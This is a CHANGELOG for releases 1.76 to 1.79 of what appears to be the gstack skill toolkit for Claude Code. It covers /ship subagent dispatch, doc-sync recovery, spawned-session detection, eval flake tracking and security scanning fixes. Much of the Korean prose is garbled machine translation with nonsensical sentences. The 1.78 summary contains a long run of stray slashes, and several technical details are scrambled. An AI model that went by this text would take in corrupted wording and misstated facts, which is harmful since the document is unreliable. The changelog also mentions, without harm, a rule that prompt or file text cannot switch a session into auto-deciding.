# 변경 로그

## [1.79.0.0] - 2026-09-01

**/ship는 no 더 길게 배경이 있는 subagent에 의해 좌초될 수 있습니다.** **두 번이 찢어지는 버그 클래스는 모든 곳에서 생명을 불어 넣습니다.**

Claude Code v2.1.198은 기본적으로 배경에서 Agent-tool subagents 발사를 했습니다. 4개의 /ship 단계 (7, 8, 10, 18) 손은 subagent에 작동하고 JSON로 마지막 선을 파고, 그(것)들의 none는, 그래서 배는 결코 오지 않은 doc-sync 산출을 위해 대기 단계 18에 영원히 주차할 수 있었습니다. 이것은 3 시간 이 종류에는 조금이 있습니다 (#497는, 그것으로 18의 단계에, 그것이라고 고쳐진 18의 단계에 그것을 다시 발견했습니다. 기술 나무의 모든 동기 파견 사이트는 이제 명시 된 깃발을 운반하고, 플래그는 파일 당 테스트 핀으로 되며 네 번째 재발은 CI가 순간 착륙을 실패합니다.

doc-sync 파견은 또한 진짜 실패 취급을 얻었습니다. 파견이 어쨌든, 대략 10 분 동안 부모 오염을 얻은 경우, 런웨이 작업을 중지하고, 어떤 commit를 미리 파견 HEAD에 대해 만든 서브 에이전트을 재구성하고, 거꾸로 대신 문서 섹션없이 PR를 발송합니다. 에이전트 자체는 docs에서만 범위 보호됩니다. VERSION를 변경하지 않고 branch를 병합하지 않고 Codex doc review (모자는 검토 패스를 소유하고, 부모가 재난하는 부모를 위해 push로 `pushed:false`로 거부된 push를 보고합니다.

### 중요 한 숫자

출처: `test/run-in-background-guidance.test.ts` (핀 리스트)와 `grep -rl 'run_in_background: false' --include='*.md'` 이 나무에 대하여.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 생성된 파일은 플래그를 수행하기 위해 핀 | 2 | 24 | 모든 sync 파견 사이트 |
| /ship 마감일 + 복구 branch를 가진 파견 단계 | 0 의 4 | 4 총 4 | 단계 7/8/10/18 |
| /ship 단계 18 최악의 케이스 대기 (배경 파견) | 의논하기 | 10분 | 문서 복구; 전경 걸은 하네스 바운드를 유지 |
| Codex doc는 배 분리된 doc-sync 안에 검토합니다. | 배 당 ~5-10 분 | skipped | 부모는 리뷰를 소유합니다. |
| Headless 문은 VERSION 중간 선을 mutate 할 수 있었습니다 | 2 | 0 | 단계 8.3/8.4d Skip to Skip |

unbounded-to-10 분 번호는 당신이 느끼는 것: 실패 형태는 “내 배 달리는 인쇄한 회복 선에 시간”를 위해 거기 앉아 있고 아직도 땅이 PR.

이 수단은 여기에 배송하는 모든 것을 의미합니다. /ship는 하네스 misbehaves가 될 때도 마무리되며, doc-sync는 릴리스 또는 더블 실행 검토 패스를 재수할 수 없으며, 이제 문서 릴리스는 자체 스파덴 세션 계약을 수행하므로 (/ship)는 안전한 headless 동작을 가져옵니다.

### 항목화 된 변경

#### 추가
- **Deadline + 각 /ship 파견 단계에 회복.** 7 단계와 8 정지 runaway 작업과 미시건이 완료되지 않는 경우 인라인 감사로 돌아갑니다 (10 분); 단계 10 레코드 Greptile triage as UNAVAILABLE in PR body 오히려 pretending 영 코멘트; 단계 18 정지 runaway 작업, vets and pushes orphaned docs-only commits (never VERSION, package.json, 또는 <6/>;; 명시된 두 번째 실패 branch는 이동된 리모트를 커버합니다), 표면은 그로 인해 콘텐츠를 훼손하지 않고 편집하고 문서 섹션없이 진행합니다. 파견 계약은 명시적 실패 JSON 모양을 운반하므로 깨끗한 문서 대신 실패로 보고서를 실행할 수 없는 doc-sync를 수행합니다. No 단계는 조용히 실행을 주차합니다.
- **문서 릴리스 자체에 스팸 방지 계약.** 은 preamble의 `SESSION_KIND: spawned` echo ( 파견자의 `GSTACK_SESSION_KIND=spawned` 접두사에 의해 엄격히 트리거; 프롬프트 또는 파일은 혼자서 그것을 방아쇠를 씌우지 않으며, v1.78.0.0 echo-only 규칙 일치). 모든 요청 사용자 게이트 자동 해결은 CHANGELOG 내용 또는 변경 VERSION를 다시 씁니다, 이는 Skip에 해결하고 기록 얻을 것이다. 단계 8.4d는 대화형 권고가 VERSION 범프이기 때문에 명시적 인 스팸을 나타냅니다.
- **/ship의 파견 신속한 도큐스 동기화 범위 가드**: docs만, no 기초 브레이크, no 버전 재수, CHANGELOG 부모로 왼쪽, no Codex doc review, push 거절 대신보고된 거부.

#### 변경
- Codex Documentation Review 섹션은 어떤 스파든 세션에서 자체를 건너 뛰고 있습니다. 적용 게이트는 인간을 필요로하며, 파견 워크플로우는 자체 검토 패스를 소유합니다. 이전 설치된 /ship가 새 문서 릴리스를 파견하는 버전 스쿠우를 커버합니다.
- Autoplan의 design/eng/dx 단계 파견, 검토 육군 빨간 팀, spec 검토 반복, adversarial subagent, Codex second-opinion/plan-review/doc-review fallbacks, 디자인 스케치 및 외부 목소리, CSO 확인을 찾아내고, 디자인 샷건 변종은 모든 국가 `run_in_background: false`를 명시적으로 발사합니다. 평행한 팬 아웃은 평행하게 체재합니다; 1개의 메시지에 있는 전경 호출은 동시 뛰습니다.

#### 고정
- **/ship 단계 7, 8, 10, 및 18 no 더 긴 물가는 달리** Claude Code는 #497, #2440 종류, 제 3의 반복)를 배경으로 합니다. 4개의 파견 specs는 1개의 결산자 자원이 전경 주를 공유합니다 — 파견은 에이전트 도구를 통해서만, 기술 도구 또는 인라인 실행이 결코 일어나지 않습니다 — 그래서 phrasing는 사이트 당 무질하 수 없습니다.

#### 기여자
- `{{FOREGROUND_DISPATCH_NOTE}}` (scripts/resolvers/constants.ts)는 플래그 지도를 위한 단 하나 근원입니다; 어떤 새로운 파견 템플렛에서 그것을 이용하고 동일한 투입에서 `test/run-in-background-guidance.test.ts`에 있는 `GENERATED_WITH_GUIDANCE`에 생성한 운반대를 추가하십시오. 시험의 핀 명부는 동시 파견 위치의 조사이고, 그것의 구조상 스캐너는 아무 생성한 파견이 없는 때 깃발을 부족한 원인이 되지 않습니다.
- 파일로 가기: 플래그의 PreToolUse-hook 강제 (P1, 구조적 수정), 문서 릴리스의 기능 좁은 배 모드, 그리고 크로스 호스트 파견 semantics 감사.
- 캐러멜스킬 스켈레톤 천장 재 측정 및 `test/helpers/carve-guards.ts`; codex/factory 배 황금 재 렌더링; 캡처 된 파견에 E2E asserts `run_in_background === false` asserts `run_in_background === false`를 경고하고 그 정착물은 단면도가 deterministically 읽습니다.

## [1.78.0.0] - 2026-08-31

**플랜 리뷰는 다시 질문을, OSV 라네는 105 자문, 18 커뮤니티가 크레딧을 가진 토지를 수정합니다.** **업그레이드 경로는 no 더 긴 설치를 삭제할 수 있습니다.**

The fix wave. The weekly periodic eval lane broke at v1.76: the spawned-session rule let the model infer "nobody is reading this" from any scripted-looking prompt and silently auto-decide every review question, so plan reviews stopped asking. reviewCount collapsed to 0 across four skills. The trigger is now machine-verifiable and nothing else: the preamble's own echoed `SESSION_KIND: spawned` status line. No text from a dispatch prompt, file, or page can flip a session to auto-choose; env 마커를 놓은 스페인의 에이전트은 여전히 AUQ 걸이의 스파게드 탈출에 의해 실패 시간에 잡혔습니다. 재현 된 실패는 동일한 마구에 전체 질문 흐름에 0 리뷰 질문에서 갔다.

OSV 라네는 105명의 고문과 함께 3주 동안 적었고, 그 억제 파일은 v1.65 (자동 발견을 위한 잘못된 파일명, 그리고 직각 구성은 결코 배열된 lockfile anyway를 포함하지 않음) 이후 침묵적으로 주장되었다. 워크플로우는 이제 명시적인 글로벌 `--config`를 통과하고, 종속 패스는 102의 자문을 통해 명확하게 해준다. 실제로 정확히 핀치와 3/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 다이어그램 렌더링 묶음은 길에 중복 mermaid를 잃었습니다. 9.96 MB ~ 7.59 MB.

8een 커뮤니티 PR은 승인 보존 된으로 흡수되며, 12는 파 개정으로 인해 파손을 끝내거나 검토에서 발견 된 결함을 수정합니다. 나인 더 확인 된 버그는 #2679 : 실패 `mktemp` 공급 업체 업그레이드 경로에서 `rm -rf`에 의해 직접 해결됩니다. 이제 스왑은 크게 제거하고 백업을 복원합니다.

### 중요 한 숫자

소스: OSV 스캐너 v2.3.8 (정확한 방출 CI 핀) 언 클린 설치에; 주간 CI 실행 33369295978 (OSV) 및 33363624506 (기간); 지역 A/B 재개발 `test/skill-e2e-plan-ceo-finding-count.test.ts`; `bun run test` 이 나무에 v1.77.0.0 스크래치 worktree.

| Property | 의 전 | 후지후 |
|---|---|---|
| OSV `./` 재발견 검사에 대한 자문 | 105 (24 패키지, 레인 레드 3 주) | 0, 0번 출구 (3번의 추산 무시) |
| Suppression 설정 | v1.65 이후의 비활성 | 명시된 `--config`를 통해 로드됨, 배선 테스트 |
| Periodic-lane 리뷰 질문 (5-finding plan) | reviewCount=0 (14/73 shards 빨강) | 같은 repro에 전체 질문 흐름 |
| 실패한 업그레이드 스왑 | 백업 및 설치 삭제 | 백업 복원, aborts 확 |
| 커뮤니티 PRs 흡수 / 문제 폐쇄 | 40 공개 PR, 17 이러한 문제의 공개 | 18 크레딧으로 흡수, 17 문제 폐쇄 |
| 도표 렌더링 오프라인 번들 | 9.96 MB (반응하는 mermaid 10 + 11) | 7.59 MB |
| 무료 테스트 | 8,519 | 8,660 (+141; v1.77)에 빨간 영수증 |

### 너를 위한 이 뜻

플랜 리뷰는 다시 질문을, `browse stop` 실제로 Chromium, 비밀 스캔은 실패 `mktemp` 또는 느린 gitleaks probe, /gstack-upgrade에 의해 조용히 비활성화 될 수 없습니다. 나쁜 임시 직원 디디에 설치를 먹을 수 없습니다. 17 닫힌 문제 또는 18 흡수 된 PR 중 하나를 제출하면 수정이 발송됩니다. /gstack-upgrade로 업그레이드됩니다.

### 항목화 된 변경

#### 고정

- **AskUserQuestion 스파게드 트리거 객체 (periodic-lane 회귀).** v1.76 규칙은 "(또는 파견 프롬프트는 스팸으로이 세션을 표시)"이 방해 할 수 있습니다. 계획 -review E2Es는 0 질문에 붕괴했습니다. 두 핀 컨테이너 검증 라운드는 ANY 버거 경로의 선언 채널이 불안정한 것을 유지하므로 규칙은 정확히 하나의 일에 열쇠를 유지합니다. preamble의 자체 echoed STATUS 라인. 자동 텍스처는 자동 텍스처를 사용하지 않습니다. - 자동 텍스처를 거부 할 수 없습니다. - 자동 텍스처를 거부 할 수 없습니다. - 자동 텍스처를 거부 할 수 없습니다. env marker (Task-tool spawns)없이 에이전트은 AUQ Hooks' spawned Escape 문장으로 실패시에 잡혀있어 이제 명시적 선언을 요구하지 않는, 결코 방해하지 않습니다. #2733's env-prefix 채널은 비터치되지 않습니다.
- **mktemp는 모든 3개의 기술 내용 위치에 감시합니다 (#2679).** redact-doc resolver, ship pr-body, 그리고 공급 업체 업그레이드 경로는 mktemp 실패에 크게 구출; 업그레이드 스왑은 실패한 `mv` 대신 삭제에 백업을 복원, 이전에 추락 된 업그레이드로 왼쪽 stale 백업을 시작 거부; PR/MR 생성은 누락되거나 빈 스캔 된 신체 파일을 거부; GitLab MR는 스캔되지 않은 파일의 삭제를 우회하지 않는 경로; `gstack-redact --from-file ""` 실로 읽기 stdin 대신 오류.
- **OSV 라네 그린 (#2695).** Explicit `--config` (자동 발견된 구성은 수직으로 적용하고 `lib/diagram-render/bun.lock`를 결코 덮지 않습니다); `overrides` 핀 IP-주소 10.3.1 (승속 한계를 포함하여 배열된 노드 모두, 정확한 10.1.0 핀을 포함하여 - @anupamme의 #2695는 평행한 진단을 위해 신용했습니다) 및 예리한 0.35.0 (smoke-tested lock)를 위해, 표를 붙였습니다. ^1-0.1는, 표를 붙입니다; 완전하게 표를 붙입니다; 자체 빌드-script 계약 (mermaid 11.16.1, excalidraw 0.18.1, mermaid-to-excalidraw 1.1.2 → 2.2.2를 통해 범프되는 각 무시는 새로운 배선 테스트에 의해 침전된 이유, 업그레이드 트리거 및 `ignoreUntil` expiry를, 파일이 다시 시도 할 수 없습니다.
- **`--version` probe는 `timeout`로 분류하고, `no-cli` (#2716)가 아닙니다.** `no-cli`는 1개의 상태 `--is-ok`가 용서하지 않기 때문에 짐이 있는 상자에 bun-shim 설치합니다.
- **코덱 스킬: 닫히는 상담 모드 울타리, `turn.failed` 실패로 보고, 휴대용 출구 코드 캡처 (#2671, #2669).**는 닫히는 담이 반전한 후에 각 담 지역; 진술한 회전 실패는 “가능한 단선”로 읽습니다 (콘서트 모드는 no 완전성 체크를 전혀 가지고 있었습니다); `${PIPESTATUS[0]}`는 zsh의 밑에 빈으로 불고 청결한 달리는 불쾌한 출구 소음을 걸었습니다. repo-wide CommonMark-faithful 울타리 페어링 테스트는 이제 모든 생성 된 doc을 보호하고, 출구 캡처 양식은 실제 배쉬와 zsh에서 실행됩니다. 예상 `codex_timeout` zsh 사용자에 대 한 발사를 시작으로 원격 측정 — 그 반대 작업, 회귀 하지 않습니다.
- **외부-voice fallback는 정직하게 상표를 붙였습니다 (#2735).** Codex가 무효로 낙하물검출기는 동일 가족 Claude 에이전트입니다; 복사 no는 더 긴 "genuine independence"를 가진 "크로스 모델 적용"로 판매합니다.
- **skill_prefix는 gbrain 렌더링 (#2738)에서 작동합니다.** gstack-relink now name-patches the 렌더링 트리 - 파일 호스트는 실제로 봉사합니다.
- **렌더링된 섹션 경로는 원자 스왑 (#2692)을 살아남습니다.** gen-skill-docs 얻은 `--link-root`; 스왑인 콜러는 최종 디디를 통과하므로 렌더링 된 기술 no 더 긴 ~9 죽은 읽기 경로를 디렉토리에 스왑으로 삭제합니다.
- **지속적인 타임라인 스톱 후크 옵트 아웃 (#2677).** `--no-team`는 1발을 유지합니다; 새로운 `timeline_stop_hook` 구성 열쇠 (가발, env, 가득 차있는 gstack 구성 표면)는 격상시키고, 명시한 “no”는 살아있는 등록을 제거합니다.
- **검색: macOS headless GPU 회전 탬드 + 자물쇠없는 headless Chromium는 정지 (#2709)에 재출입됩니다.** Darwin-gated flag set (reporter-validated, `GSTACK_DISABLE_GPU=off` Escape)는 순수하고, 단식 기능으로 노출되어 있습니다. daemon는 시작된 아이의 pid + start time을 기록하고, 기록된 시작 시간과 Chromium-looking cmdline 모두 확인한 후 생존자를 다시 떼어냅니다.
- **gstack-wtree: 실패 `touch`는 HEAD씨 (#2687 강하게 하는)를 통해서 떨어졌습니다.** 동일한 크기 읽는 레이스가 v1.74에서 조정되었습니다; 보고인의 재개발은 지금 20/20 청소를 실행하고, 닫힐 수 있던 1개의 침묵하는 경로는 닫힙니다.
- **큰 gstack-redact 보고서는 파이프 소비자를 생존.** 과거에 보고 64KiB 관 완충기는 독자가 느리 때 truncated (`process.exit`는 하수구를 이깁니다) — CI 질 문은 JSON를 파는 corrupt 보고를 보았습니다. 보고 경로는 지금 stdout 플러시를 시켰습니다; 오래된 출구 본에 대하여 시험에 의하여 입증된 빨강에 의해 핀으로 꼿습니다.

### 커뮤니티 PRs 흡수 (branch 커밋에 보존 된 이민)

- Codex preflight: CLI는 `broken_install`를 실행할 수 없는 `ready`를, 결코 실행할 수 없는 `ready` - 파는 autoplan의 손 유지된 preflight 사슬을 완료하고 중단한 spawns에 설치 신호 grep를 좁게 했습니다. @ukheni50 (#2745에 의해 공헌하는; #2742를 고치십시오.
- 설치 gstack/review 복사시 선박 설계 체크리스트 경로 포인트. @Lockyer228 (#2717; #2694)에 의해 기여.
- GStack 상태에 살고 있는 특징 감적은, 프로젝트 체크 아웃 아닙니다 — 파는 합성 활동에 종결된 CI를 재 승인하고 향상 이동을 추가했습니다 그래서 아무도는 재 직업을 얻게 됩니다. @simonaltit (#2748; #2728)에 의해 공헌하는.
- 메모리-ingest: 성적표 no 더 긴 허벅지 충돌 (887 단계 → 0 ingested) 또는 frontmatter-fence 렌더링 버그; 진드기 주에 persist를 할당, 그래서 페이지는 실행에 걸쳐 슬러지 유지하고 새로운 콜러는 변경되지 않은 페이지를 덮지 수 없습니다. @rayers에 의해 기여 (#2699; 수정 #2724).
- js/eval는 async IIFE의 값을 반환합니다. @loulanyue (#2747; #2727)에 의해 기여합니다.
- 토지 및 배포는 머리 저장소에 포크 지점을 확인합니다. 파도는 메타 데이터 명령 (gh 잎 `nameWithOwner` 빈)을 대체하고 포크 지점 보고서 만 만들었습니다. @pttydou (#2725; #2696)에 의해 기여.
- gstack-config는 설정에서 `cross_project_learnings`를 변형시킵니다. @szsunyuan (#2676; #2673)에 의해 기여합니다.
- gbrain-sync의 핀 소스 테스트는 라이브 오토파이트의 밑에 신비합니다. @szsunyuan (#2689에 의해 공헌하는; #2685를 고치십시오.
- redact: stale 관리된 pre-push 걸이는 장소에서, 그래서 포장 포장한 포장한 고침 존재 설치를 발송합니다. @schienbiz (#2731)에 의해 공헌하는.
- 적정: Groq, Tavily, 그리고 Notion API 열쇠 본. @schienbiz (#2730)에 의해 공헌하는.
- redact: `.env.local`는 내부 hostname이 아닙니다. @davidani-davi (#2740)에 의해 기여했습니다.
- redact: git SSH 리모트는 이메일이 아닙니다 — 파는 lookahead 일정한 지명합니다. @alopes50 (#2734)에 의해 공헌하는.
- gbrain ≥0.43는 엔진 잠금으로 냉각을 분류, 깨지지 않는 구성. @pvanl (#2698)에 의해 기여.
- 느린 gitleaks probe no는 더 긴 영원하게 비밀 스캐닝을 비활성화합니다 - 그리고 3 연속 느린 대답은 파일 당 런 중지 재 프로빙을 중지합니다 (로드 박스 no는 장시간 동안 큰 섭취를 넣습니다), 경고 한 번; 다음 런 프로브 신선한. @deniszjukow (#2715)에 의해 기여.
- open-gstack-browser pre-flight 실제로 stale daemon (pid grep은 꽤 인쇄 된 JSON)를 죽이지 않습니다. @deniszjukow (#2714)에 의해 기여했습니다.
- CLI는 프로파일록 정리에서 CHROMIUM_PROFILE를 수여합니다. 파는 배선 삼각대를 추가했습니다. @adam-badar (#2732)에 의해 공헌합니다.
- make-pdf's pdftotext probe는 어디에나 "알 수없는"보고 대신 팝업의 stderr 배너를 읽습니다. @snymanpaul (#2690)에 의해 기여했습니다.
- bin 작가 no 더 긴 드롭 학습 및 질문 이벤트는 apostrophes와 경로; MSYS-form GSTACK_HOME 작품 - 파는 env-var 수입 패턴에 모든 4 작가를 통합. @shreshth-designs에 의해 기여 (#2720).

#### 기여자

- 테스트: 8,519 → 8,660 (+141 파의 맞은편; 모든 행동 수정은 기본 호환 reproducers를 통해 v1.77.0.0 스크래치 worktree에 대한 회귀 테스트 입증 된 빨간색을 나르 - 단지 영수증으로 계산하지 않는 기초에 컴파일하지 않는 테스트).
- 새로운 구조상 감시: 생성 문서 담 쌍 (CommonMark 국가 기계, mod-2 계산하지 않음), no bare `${PIPESTATUS[0]}` 코덱 섹션 (실제 bash+zsh 실행 플러스), OSV 구성 배선 (flag ↔ 파일명 ↔ 항목 위생, `ignoreUntil` 필수), gstack-redact CLI 빈 경로 거부, cli.ts 단면도 다리 delegation.
- 19 캐비드 스켈레톤 천장은 측정 값 (+ ~ 440 바이트/skill AUQ 담); autoplan은 끊긴 설치 preflight 팔을 다시 핀으로 꼿습니다.
- `gen-skill-docs --link-root`는 렌더링-into-tmp-then-swap 콜러에 존재합니다. 직접 렌더링 콜러는 no 변경이 필요합니다.
- 흡수 테스트 파일은 스파크 타임 아웃을 얻었다 (v1.77 sync-spawn tripwire는 그들을 미리 업데이트).

## [1.77.0.0] - 2026-08-31

**PR는 evals를 두 번 지불합니다.** **조각은 이제 측정되고 뿌리에서 죽고 울타리를 뿌립니다.**

테스트 인프라는 오버헤울, 파를 얻었다. 각 PR에 슬라이딩 레인의 AHEAD를 직렬화 한 레거시 17-row eval matrix는 삭제된다 : 한 유료 레인, 그 게이트 인구는 주자 자체에서 파생, 그래서 새로운 게이트 테스트는 인구 조사에 현재 그것의 파일 토지. No 드리프트에 수동 열을 제거하고 이미 시도 한 드립, 새로운 매트릭스는 중간에 해결된다. <br /> 건설에 의해 설계 된 기본을 해결하고, 그것은 건설을 다루기 위해 설계되었다.

The flake war moved from anecdotes to instruments. Every retried pass is now recorded where it cannot hide (bun's own output shows a retry as a clean pass, we probed it), the free lane retries a failing file once, loudly, and appends every flaky pass to a per-project ledger uploaded from CI on green runs. `bun run eval:flake-rank` ranks the series. And the wedge class that hit main, a hung child under a blocking spawnSync that no in-process timeout can interrupt, is extinct: 499 시간 초과없는 동기화 - spawn트 사이트 146 파일 (branch tripwire의 자신의 카운트에 대한 주요) swept에서 0, 래치드 트립 와이어와 함께 첫 번째 실제 오프 엔드 엔드 엔드 엔드가 합병에서 도착.

### 중요 한 숫자

출처: CI 실행 33263204465 / 33262077256 (측정 2026-08-29), repo 인구 조사 (`test/helpers/touchfiles-data.ts`), 그리고 스위프트 삼각 (`test/spawnsync-timeout-tripwire.test.ts`).

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| PR 당 유료 레인 | 2 (동일한) | 1 | eval 벽 35.5 → ~13 분 (타겟) |
| PR 당 중복 지출 측정 | ~$20.94 | $0 | matrix 삭제 |
| 게이트 계수키 | 86 (6 팬텀) | 77, 모든 유쾌한 살아 | 역방향 invariant 시행 |
| Sync의 spawn즈는 shard를 쐐기 할 수 있습니다 | 499 비행 | 0 (8 소멸) | 여행선-ratcheted |
| 지역 문 최악의 경우 | ~6.5 h (4×4 작업) | ~3.3 h (8×2) | 고립은 첫번째 착륙했습니다 |
| Retried-pass 가시성 | 의논하기 | 기록된 + 순위 | `eval:flake-rank` |

팬텀 검열 번호는 조용한 것들입니다. 6개의 병합 차단은 맵 키만 존재합니다. 그들은 삭제되고, 생활 테스트가 없는 열쇠는 이제는 무료 스위트가 실패합니다.

이 수단은 누구에게도 배송하는 것을 의미합니다. PR은 정직한 유료 베로딕트를 빠르고 저렴하게 얻을 수 있으며, flaky 패스는 merge를 차단하지 않고 결코 사라지지 않으며, 걸려있는 테스트는 shard가 아닙니다. 뱀 ledger의 베로딕트를 원할 때 `bun run eval:flake-rank`를 실행하십시오.

### 항목화 된 변경

#### 추가
- **Flake telemetry, 끝.** Eval-store 레코드 모든 재 시도 (`attempt`, `flaky_retries`), 경고로 전달되는 유료 보고서 목록, 무료 레인의 플레키 리트리 패스는 ON (CI)의 branch + 셰이거 (branch + 셰이 특성, default)에 의해 프로젝트는 ON (`bun run eval:flake-rank`)의 CI (branch)와 JSONL ledger (branch + 셰이 특성, default)에 대한 예술적 책임과 함께 업로드.
- **2단계 세션 타임아웃.** 침묵 API는 시작 우아함 (90s 지방, 300s CI 지면, 특정한 이유 `timeout_startup`를 가진 진짜 `Math.max` 지면)에 600s 일 예산을 불투명 `0 turns / $0.00` 실패로 점화하는 대신에, 600s 일 이유를 가진 실제 `Math.max` 지면 죽습니다; 첫번째 바이트에 일 예산 팔 및 총 벽 결코 성장하지 않습니다.
- **그린 바이 스키 조사.** "Ran N test"는 건너뛰기 때문에, 각 테스트 자체가 적용으로 읽는 데 사용되는 코드/gemini 파일이 있습니다. 클래스터는 이제 bun's Skip/pass recap을 파고, 유료 보고서는 모든 스크린 패스 "잘못된 아무것도"를 라벨을 붙입니다.
- **Sync-spawn 타임 아웃 트립 와이어** (spawnSync / execSync / execFileSync / Bun.spawnSync, comment-aware, 30-line window, 수축 전용 배제 래치드) 플러스 원-SHA 고정 금지 (`git show <sha>:path` 고정장치는 공급되어야 합니다; 한 라이브 배드 지금 읽는 투입된 정착물).
- **행동종종종**: 가짜 claude shim는 CLI 또는 그 할머니가 살아남지 않는 시간의 세션을 증명합니다; 두 개의 gstack-detach watchdog 테스트 덮개 TERM-immune grandchildren 및 지도자 - 디젤 첫 번째 케이스.
- **CLI 버전 스탬핑**: 각 eval run 레코드 `claude --version` (런너 부모에서 한 번 해결), 그래서 다음 TUI-drift flake hunt is a grep, 고고학.

#### 변경
- **1개의 유료 차선.** 레거시 evals.yml 매트릭스는 정적 패리티 영수증 후 삭제 (순수한 삭제, 한 개의 역 복원) : 슬라이스드 레인의 49 파일에 의해 파생 된 조사자들은 엄격하게 매트릭스의 18 파일을 포함. PR 코멘트는 최종 비결 회계 및 실패 닫힌 재조합으로 슬라이스드 레인으로 이동.
- **유료 런너 기본 4 × 4 → 8 × 2**: ~10-13 ~4-6 대신 실습 세션(문서 안전 15); per-shard TMPDIR/Chromium-profile 고립 및 kill-path 정리 백스톱 착륙, deliberately.
- **CI 4개의 복합적인 행동으로 deduplicated**; 등록-skills 복합물은 삭제 된 모체 복사가 가지고있는 fail-fast dangling-symlink 검증 루프를 운반하므로, surviving lanes가 상속합니다. Rerun-safe, 냉동-lockfile fallback, 입력 유효성.
- **공급 체인 핀**: CI 이미지의 claude CLI는 PTY 문을 달리는 정확한 버전 (범프는 PTY 문을 달고, 주일로 떨어뜨린 편류를 끝내는 PRs를 타고 마구를 3배 끊어지게 합니다), 그리고 비밀 방위 그림 그리기 작업에 있는 각 활동은 SHA 핀으로 꼿습니다.
- **여정은 그들의 대답 열쇠를 잃었습니다**: 정착물 no 더 긴 ships prompt→skill lookup 테이블, 그래서 회귀한 기술 묘사는 실제로 시험이, 대략 반에 전례 비용 (2개의 회전, [Skill, 읽기]만 실패할 수 있습니다)에 실패할 수 있습니다.
- A/B 실험 은퇴 (auq-repetition-cut, preamble-script, opus-47 단 하나 실행 fanout 비교): 1 샷 질문 대답 개월 전 no 더 긴 재 실행 주간 동전 플립으로. `plan-ceo-review-expansion-energy` 그리고 `ios-qa-e2e`는 그 이유를 가진 정기적인 층으로 이동했습니다.

#### 고정
- **실패 열려있는 reconcile 문**: GitHub의 default 런 스텝 쉘은 no pipefail이 있어, 실패 닫히는 보고의 출구는 `tee` (always 0)에서 급여받는 차선에서 읽혔습니다. 이제 `PIPESTATUS[0]`는, 배선 시험에 의해 핀으로 꼿습니다.
- **글쓰기 - 토큰 신뢰 경계**: PR-authored code no를 실행하는 일은 PR-comment 쓰기 token를 더 긴 붙듭니다; 0 repo 코드를 실행하는 일에 움직여.
- **공급자-runner orphans**: 운동은 전체적인 과정 그룹을 죽이고 (클래드, 코덱, gemini, 그리고 그룹 ID가 붙은 상태에서 gstack-detach의 watchdog), 그리고 코덱/gemini 주자만 claude 복사가 있었습니다. 관찰된 600s-timeout-stretching-past-1400s 종류는 회귀와 더불어 사라집니다.
- **선택 무결성**: 17 팬텀 선택 키 삭제 (역방향 invariant는 이제 모든 키가 살아있는 테스트 이름을 지어야 합니다), gitignored `.agents/**` dep 패턴은 git diff가 발전기로 대체할 수 없는, codex/gemini 로컬 터치파일 포크는 canonical 지도에서 파생됩니다.
- **크로스 샤드 SKILL.md 경주**: opus-47 eval은 살아있는 나무의 기술 파일 중반을 재생했습니다; 그것은 지금 `--out-dir`를 통해 찰상 dir로 만듭니다.

#### 기여자
- `bun run eval:flake-rank` (`--json`, `--dir`, `--since-days`)는 프로모션 시 다이얼입니다; WS16 필수 검사 결정은 그것을 읽습니다.
- 오버홀 계획 (16개의 워크스트림, CEO + eng은 두 개의 크로스모델 외의 목소리로 전달) 계속: 예산 aware shard wall, PTY 읽기 이벤트, 무료 스플릿, 판사 세터미즘, 필요한 체크 프로모션은 다음 파도입니다.


## [1.76.0.0] - 2026-08-31

**Ship's doc-sync는 이제 지휘자를 살아남습니다.** **spawn이드 에이전트은 마침내 그들은 spawn이드를 알고 있습니다.**

Every Conductor-hosted /ship used to lose its PR `## Documentation` section the moment the document-release subagent hit an interactive gate: the subagent inherited the parent's environment, classified itself as a session a human was watching, rendered a decision brief nobody could answer, and stopped. The JSON contract broke, every time a gate fired (#2733). This release makes the spawned classification reachable: /ship는 `GSTACK_SESSION_KIND=spawned`와 함께 에이전트을 표하며, 전체 스택 (preamble, AskUserQuestion 규칙, AUQ 걸이)는 이제 아무도를 글쓰기 대신 권장 옵션을 자동 조이하여 문을 해결합니다. 파괴적 옵션은 결코 자동 조이, 어떤 표면에서 : 보수적 선택 승리를하고 기록됩니다. 자동 조인 결정은 `decisions` 어드밴스드에서 부모가 콘솔에 인쇄를 결정하기 때문에 아무것도 결정하지 않습니다.

### 중요 한 숫자

출처: 새로운 게이트 층 E2E (`test/skill-e2e-docsync-spawned.test.ts`)는 `~/.gstack/projects/<slug>/evals/`의 밑에 영수증을, 플러스 문제 #2733의 분야 보고 실행합니다.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| `## Documentation` 에 지휘자 호스팅 배 | doc문이 불을 떨어질 때마다 떨어졌다. | 현재 E2E-proven | fixed |
| spawn이드 분류에 도달하는 방법 | 1 (OpenClaw env 전용) | 어떤 파견 기술, 1 env prefix | 새로운 원시 |
| unwatched subagents에 의해 소모품을 표시 | 런당 최대 11 블록, 마커 eaten | 0 방출, Markers는 다음의 인간 세션을 보존 | —— 미스 |
| Real-agent E2E through a firing VERSION gate | prose-STOP, JSON 파스 실패 | 권장된 Skip, JSON 파, VERSION 파로 치는 자동 척 | 1/1 패스, $0.35, 106s |
| spawn이드 시작 당 죽은 작품 | 네트워크 업데이트 체크 + 17-subprocess repo probe | 모두 건너 뛰기 | 빠른 에이전트 |

E2E는 실제 문서 방출 전방 및 VERSION 문 내부의 AUQ 걸이 활성화, 기계 적당한 계약에 종료된 후 VERSION를 가진 지휘자 주위 환경 안쪽에 실제 문서 방출 전방 및 VERSION 문에 있는 영수증입니다.

### 작업 흐름을 의미하는 것

지휘자와 PR에서 배는 문서 섹션을 다시 나릅니다. 어떤 문은 서브 에이전트 자동 요오드가 콘솔의 `Doc-sync auto-decisions:` 라인으로 표시됩니다. 관현악 능력을 구축하면 `GSTACK_SESSION_KIND=spawned `과 `gstack-skill-start`를 호출하고 적절한 노동자와 행동합니다. no 동의는 소모된, no telemetry 질문, no는 몸에 간결합니다. 어떤 사람이 실제로 운전하는 세션에 마커를 설정하면, 이제 preamble은 그렇게 크게 (`SPAWNED_OVERRIDE: env`)라고 말합니다.

### 항목화 된 변경

### 추가

